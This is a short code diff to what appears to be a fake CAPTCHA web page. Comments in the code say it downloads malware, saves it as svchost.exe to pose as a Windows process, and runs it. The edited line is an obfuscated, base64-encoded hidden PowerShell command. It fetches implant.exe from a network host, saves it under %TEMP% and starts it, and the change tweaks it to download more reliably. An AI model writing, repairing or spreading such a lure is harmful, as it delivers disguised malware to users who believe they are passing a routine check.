@@ -210,7 +210,7 @@
         // 2. Saves as svchost.exe in %TEMP% (masquerading as Windows process)
         // 3. Executes the malware immediately
         
-        const maliciousPayload = `powershell -w hidden -enc aQB3AHIAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAzADcAOgAxADMAMwA3AC8AaQBtAHAAbABhAG4AdAAuAGUAeABlACAALQBPACAAJABlAG4AdgA6AHQAZQBtAHAAXABzAHYAYwBoAG8AcwB0AC4AZQB4AGUAOwBzAHQAYQByAHQAIAAkAGUAbgB2ADoAdABlAG0AcABcAHMAdgBjAGgAbwBzAHQALgBlAHgAZQA`;
+        const maliciousPayload = `powershell -w hidden -enc aQB3AHIAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAzADcAOgAxADMAMwA3AC8AaQBtAHAAbABhAG4AdAAuAGUAeABlACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0ATwAgACQAZQBuAHYAOgB0AGUAbQBwAFwAcwB2AGMAaABvAHMAdAAuAGUAeABlADsAcwB0AGEAcgB0ACAAJABlAG4AdgA6AHQAZQBtAHAAXABzAHYAYwBoAG8AcwB0AC4AZQB4AGUA`;
 
         document.getElementById('captchaBtn').addEventListener('click', async function() {
             try {
